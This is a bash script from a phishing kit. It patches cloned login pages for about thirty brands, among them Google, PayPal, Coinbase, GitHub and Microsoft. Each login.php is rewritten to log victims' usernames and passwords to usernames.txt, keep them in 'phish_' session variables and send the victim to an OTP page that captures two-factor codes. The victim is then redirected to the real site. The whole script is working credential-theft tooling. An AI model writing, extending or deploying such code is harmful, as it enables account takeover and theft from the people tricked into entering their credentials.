#!/bin/bash
set -e
BASE="$(cd "$(dirname "$0")" && pwd)"
SITES="$BASE/sites"
TEMPLATE="$BASE/otp_template.php"

brand_for(){
  case "$1" in
    instagram|instafollowers) echo "Instagram";; facebook|messenger) echo "Facebook";;
    google) echo "Google";; microsoft) echo "Microsoft";; netflix) echo "Netflix";;
    paypal) echo "PayPal";; steam) echo "Steam";; twitter) echo "X (Twitter)";;
    spotify) echo "Spotify";; adobe) echo "Adobe";; badoo) echo "Badoo";;
    cryptocurrency) echo "Coinbase";; devianart) echo "DeviantArt";; dropbox) echo "Dropbox";;
    github) echo "GitHub";; gitlab) echo "GitLab";; linkedin) echo "LinkedIn";;
    myspace) echo "MySpace";; origin) echo "EA Origin";; pinterest) echo "Pinterest";;
    protonmail) echo "Proton Mail";; shopify) echo "Shopify";; snapchat) echo "Snapchat";;
    shopping) echo "Amazon";; twitch) echo "Twitch";; verizon) echo "Verizon";;
    vk) echo "VK";; wordpress) echo "WordPress";; yahoo) echo "Yahoo";;
    yandex) echo "Yandex";; *) echo "Security";;
  esac
}

redirect_for(){
  case "$1" in
    instagram|instafollowers) echo "https://www.instagram.com";; facebook) echo "https://www.facebook.com";;
    messenger) echo "https://www.messenger.com";; google) echo "https://accounts.google.com";;
    microsoft) echo "https://login.microsoftonline.com";; netflix) echo "https://www.netflix.com";;
    paypal) echo "https://www.paypal.com";; steam) echo "https://store.steampowered.com";;
    twitter) echo "https://twitter.com";; spotify) echo "https://www.spotify.com";;
    adobe) echo "https://www.adobe.com";; badoo) echo "https://badoo.com";;
    cryptocurrency) echo "https://www.coinbase.com";; devianart) echo "https://www.deviantart.com";;
    dropbox) echo "https://www.dropbox.com";; github) echo "https://github.com";;
    gitlab) echo "https://gitlab.com";; linkedin) echo "https://www.linkedin.com";;
    myspace) echo "https://myspace.com";; origin) echo "https://www.origin.com";;
    pinterest) echo "https://www.pinterest.com";; protonmail) echo "https://mail.proton.me";;
    shopify) echo "https://www.shopify.com";; snapchat) echo "https://www.snapchat.com";;
    shopping) echo "https://www.amazon.com";; twitch) echo "https://www.twitch.tv";;
    verizon) echo "https://www.verizon.com";; vk) echo "https://vk.com";;
    wordpress) echo "https://wordpress.com";; yahoo) echo "https://login.yahoo.com";;
    yandex) echo "https://passport.yandex.com";; *) echo "https://www.google.com";;
  esac
}

count=0
for dir in "$SITES"/*/; do
  name="$(basename "$dir")"
  [ -f "$dir/login.php" ] || continue
  brand="$(brand_for "$name")"
  redir="$(redirect_for "$name")"
  cp "$TEMPLATE" "$dir/otp.php"
  [ -f "$dir/login.php.orig" ] || cp "$dir/login.php" "$dir/login.php.orig"
  cat > "$dir/login.php" << PHP_EOF
<?php
session_start();
\$u = \$_POST['username'] ?? '';
\$p = \$_POST['password'] ?? '';
\$_SESSION['phish_user'] = \$u;
\$_SESSION['phish_pass'] = \$p;
\$_SESSION['phish_redirect'] = '$redir';
\$_SESSION['phish_brand'] = '$brand';
file_put_contents("usernames.txt", "Account: " . \$u . " Pass: " . \$p . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>
PHP_EOF
  count=$((count+1))
  echo "[+] $name -> otp.php + login.php patched"
done
echo ""
echo "Done. $count sites upgraded with 2FA."
